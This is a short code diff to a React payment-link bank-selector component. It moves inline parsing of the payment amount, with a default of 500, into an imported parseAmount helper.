@@ -11,6 +11,7 @@ import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
 import { getCountryByCode } from "@/lib/countries";
 import { getBanksByCountry, Bank } from "@/lib/banks";
 import { formatCurrency } from "@/lib/countryCurrencies";
+import { parseAmount } from "@/utils/amountParser";
 
 const PaymentBankSelector = () => {
   const { id } = useParams();
@@ -44,19 +45,7 @@ const PaymentBankSelector = () => {
 
   // Get amount from link data - prioritize payment_data amount, then payment_amount, then cod_amount
   const rawAmount = paymentData?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount;
-
-  // Handle different data types and edge cases
-  let amount = 500; // Default value
-  if (rawAmount !== undefined && rawAmount !== null) {
-    if (typeof rawAmount === 'number') {
-      amount = rawAmount;
-    } else if (typeof rawAmount === 'string') {
-      const parsed = parseFloat(rawAmount);
-      if (!isNaN(parsed)) {
-        amount = parsed;
-      }
-    }
-  }
+  const amount = parseAmount(rawAmount, 500);
 
   // Get saved currency code from payment_data or shipping info
   const currencyCode = paymentData?.currency_code || shippingInfo?.currency_code || countryData?.currency || "SAR";
